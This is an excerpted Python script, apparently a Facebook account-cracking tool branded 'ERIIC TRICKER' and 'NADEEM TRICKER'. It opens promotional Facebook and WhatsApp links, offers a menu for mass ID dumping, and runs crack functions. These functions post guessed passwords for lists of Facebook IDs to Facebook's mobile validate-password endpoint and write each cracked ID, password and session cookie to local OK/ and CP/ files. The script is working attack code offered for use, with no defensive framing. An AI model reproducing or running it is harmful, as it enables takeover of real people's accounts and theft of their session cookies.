...
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/Aashish.God.94 ')
#------------------[ ERIIC-TRICKER ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/Aashish.God.94')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
os.system("xdg-open https://chat.whatsapp.com/ELLVRskIk9X0uDUhWnGp2L ")
#------------------[ LOGO-LAKNAT ]-----------------#
logo =""" 
╔─────────────────────────────────────────────╗
...
os.system('espeak -a 300 " WELCOME TO ERIIC TRICKER TOOL"')
pass
...
def menu():
    ...
    print('\033[0;97m=================')
    AASHISH = input('\x1b[1;92m[+] CHOOSE: ')
    if AASHISH in ['111']:
        login()
        dump_massal()
    elif NADEEM in ['1']:
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[LEGEND NADEEM TRICKER•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[LEGEND ERIIC TRICKER-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[LEGEND ⋙ 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟 ⋙🤍] {idf} • {pw}\n\033[0;93m[👤]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " LEGEND NADEEM TRICKER,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[LEGEND NADEEM TRICKER-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•LEGEND NADEEM TRICKER-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•⋙ 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟 ⋙] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  LEGEND NADEEM TRICKER,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
